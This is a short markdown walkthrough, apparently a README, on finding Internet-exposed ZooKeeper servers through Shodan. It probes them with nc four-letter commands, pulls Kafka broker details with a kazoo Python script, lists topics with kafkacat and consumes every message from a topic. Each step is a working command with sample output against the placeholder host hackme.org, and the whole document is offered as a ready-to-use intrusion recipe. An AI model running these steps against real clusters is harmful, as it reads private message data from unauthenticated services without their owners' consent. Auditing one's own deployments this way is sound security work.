# Kafkas and where to find them

### 1. Find a ZooKeeper IP - leader node (e.g. using [Shodan](https://www.shodan.io/search?query=zookeeper))

### 2. Check its health

 ```bash
 $ echo ruok | nc zoo.hackme.org 2181

 imok
 ```

### 3. Interrogate the node using other [ZooKeeper command](https://zookeeper.apache.org/doc/r3.1.2/zookeeperAdmin.html#sc_zkCommands) 

Print details about serving environment (note the Kafka libraries on classpath):

```bash
$ echo envi | nc zoo.hackme.org 2181

Environment:
zookeeper.version=3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f,
				  built on 03/23/2017 10:13 GMT
host.name=zoo.hackme.org
java.version=1.8.0_181
java.vendor=Oracle Corporation
java.home=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre
java.class.path=/opt/kafka_2.11-1.1.0/bin/../libs/aopalliance-repackaged
				-2.5.0-b32.jar:/opt/kafka_2.11-1.1.0/bin/../libs/argparse4j
				-0.7.0.jar:/opt/kafka_2.11-1.1.0/bin/../libs/commons-lang3
				-3.5.jar:...
```


List the (ephemeral) nodes to find any connected brokers:

```bash
$ echo dump | nc zoo.hackme.org 2181

SessionTracker dump:
Session Sets (3):
0 expire at Fri Feb 15 20:43:09 CET 2019:
0 expire at Fri Feb 15 20:43:12 CET 2019:
1 expire at Fri Feb 15 20:43:15 CET 2019:
	0x16883e87c240000
ephemeral nodes dump:
Sessions with Ephemerals (1):
0x16883e87c240000:
	/controller
	/brokers/ids/0

```

### 4. Fetch details about the broker (e.g. using [kazoo](https://kazoo.readthedocs.io/en/latest/basic_usage.html))

```python
# kazoo-dump.py

from kazoo.client import KazooClient
import logging

logging.basicConfig()
zk = KazooClient(hosts='zoo.hackme.org:2181')
zk.start()

data, stat = zk.get("/brokers/ids/0")
print("Version: %s, data: %s" % (stat.version, data.decode("utf-8")))

zk.stop()
```

```bash
$ python kazoo-dump.py

Version: 0, data: {
    "listener_security_protocol_map": {
        "PLAINTEXT": "PLAINTEXT"
    },
    "endpoints": ["PLAINTEXT://kafka.hackme.org:9092"],
    "jmx_port": -1,
    "host": "kafka.hackme.org",
    "timestamp": "1548401285140",
    "port": 9092,
    "version": 4
}
```

### 5. We now have a Kafka broker, let's ask for its topics with [kafkacat]()

```bash
$ kafkacat -b kafka.hackme.org:9092 -L

Metadata for all topics (from broker -1: kafka.hackme.org:9092/bootstrap):
 1 brokers:
  broker 0 at kafka.hackme.org:9092
 3 topics:
  topic "topic_foo" with 1 partitions:
    partition 0, leader 0, replicas: 0, isrs: 0
  topic "topic_bar" with 1 partitions:
    partition 0, leader 0, replicas: 0, isrs: 0
  topic "topic_baz" with 1 partitions:
    partition 0, leader 0, replicas: 0, isrs: 0
```

### 6. Consume messages for any topic

```bash
$ kafkacat -b kafka.hackme.org:9092 -C -t topic_foo -o beginning
```
